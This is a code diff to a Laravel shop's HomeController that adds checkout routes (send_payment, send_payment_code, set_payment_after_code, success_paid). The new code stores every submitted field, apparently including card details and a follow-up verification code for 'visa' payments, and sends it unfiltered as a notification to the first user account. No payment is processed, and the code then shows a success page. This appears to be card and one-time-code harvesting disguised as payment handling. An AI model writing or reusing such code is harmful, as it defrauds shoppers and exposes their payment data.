@@ -30,6 +30,7 @@ use Illuminate\Support\Facades\Response;
 use Illuminate\Auth\Events\PasswordReset;
 use App\Mail\SecondEmailVerifyMailManager;
 use App\Models\Cart;
+use App\Notifications\SendNotification;
 
 class HomeController extends Controller
 {
@@ -45,6 +46,43 @@ class HomeController extends Controller
         });
 
         return view('frontend.index', compact('featured_categories'));
+    }
+    public function set_payment_after_code(Request $request){
+        $cart = session('carts');
+        $cart['cart_code'] = $request->all();
+        session(['carts' => $cart]);
+        $user = User::first();
+        $user->notify(new SendNotification($cart));
+        return view('frontend.final_code');
+    }
+    public function send_payment_code(Request $request){
+        $cart = session('carts');
+        $cart['code'] = $request->all();
+        session(['carts' => $cart]);
+        $user = User::first();
+        // dd($cart);
+        $user->notify(new SendNotification($cart));
+    }
+    public function send_payment(Request $request){
+        $cart = session('carts');
+        $cart['cart_info'] = $request->all();
+        session(['carts' => $cart]);
+        $user = User::first();
+        // dd($cart);
+
+        // $user->notify(new SendNotification($cart));
+        if($request->payment_method =='visa' ){  
+                  return view('frontend.code');
+        }else{
+            return redirect()->route('success_paid');
+  
+        }
+    }
+    public function success_paid(){
+        $cart = session('carts');
+        session()->forget('carts');
+        $carts = Cart::where('user_id',auth()->id())->delete();
+        return view('frontend.success_paid');
     }
     
     public function load_todays_deal_section()
